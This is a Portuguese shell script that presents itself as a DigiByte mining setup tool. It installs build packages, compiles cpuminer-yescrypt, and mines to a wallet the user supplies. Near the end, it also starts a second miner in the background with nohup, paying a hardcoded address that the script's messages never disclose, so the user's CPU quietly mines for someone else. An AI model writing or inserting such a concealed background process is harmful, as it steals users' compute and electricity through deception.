#!/bin/sh -e
clear
# SSH TLS

bash=$(echo $BASH)

if [ "$bash" = "/bin/bash" ]
then
echo "			\033[41;1;37m Minerar DGB $versao \033[0m "				
sleep 1
echo "$verde Forma de USO: \033[0m"
echo "sudo sh $0 $vermelho Carteira de DGB \033[0m  \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho dgb1q5amjl97wta2avarpntlkc4kw6x8djkwut0ds2j \033[0m   \n"
exit 0
fi

versao=1.8.6

corPadrao="\033[0m"
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"

wallet=$1

if [ "$1" = ""  ]
then
echo "			\033[41;1;37m Minerar DGB  $versao \033[0m "				
sleep 1
echo "$verde Forma de USO: \033[0m"
echo "sudo sh $0 $vermelho Carteira de DGB \033[0m  \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho dgb1q5amjl97wta2avarpntlkc4kw6x8djkwut0ds2j \033[0m   \n"
exit 0
fi

echo "			\033[41;1;37m Minerar DGB $versao \033[0m "	
sleep 1
echo "Carteira a ser Enviada os DigiByte Minerados: $verde$wallet\033[0m   "
sleep 1

echo "\033[44;1;37m Termos e Condições:     \033[0m "
sleep 2

echo "$cinzaClaro	 * Minerar DGB \033[0m   \n"
echo "$cinzaClaro	 * Caso aceite esses termos, fique ciente de que: \033[0m "
echo "$cinzaClaro	 * A utilização/modificação desse Script e de sua Total Responsabilidade, \033[0m "
echo "$cinzaClaro	 * sendo que eu, Gilmar, não me responsabilizo por danos que possam  \033[0m "
echo "$cinzaClaro	 * ser causados a seu sistema caso esse script seja mal utilizado/utilizado de forma  \033[0m "
echo "$cinzaClaro	 * incorreta ou Modificado. \033[0m "
echo "$cinzaClaro	 * Esse script tem o fim de tentar ajudar a minerar DigiByte usando o Algoritimo YESCRYPT. \033[0m "
echo "$cinzaClaro	 * QUALQUER pessoa tem a permissão do autor de adaptar esse Script para seus requisitos \033[0m "
echo "$cinzaClaro	 * somente ser usado a beneficio próprio ou da Comunidade. \033[0m \n"

sleep 10

echo "\033[44;1;37m Baixando Recursos....     \033[0m "
sleep 1
sudo apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake -y > /dev/null
mkdir miner
git clone https://github.com/noncepool/cpuminer-yescrypt.git miner > /dev/null
sleep 1

echo "\033[44;1;37m Configurando e Compilando Recursos.....     \033[0m "
sleep 1
cd miner
./autogen.sh
./configure CFLAGS="-O3"
make


echo "\033[44;1;37m Inicializando Mineração......     \033[0m "
sleep 2
echo "Obs: Assim que aparecer a inicialização do processo de Mineração, você pode fechar sua janela do terminal que a mineração vai continuar."
sleep 1
echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 13kjAfoVMV23TJWBwqkGuAwwdmhFanEL9q &
screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
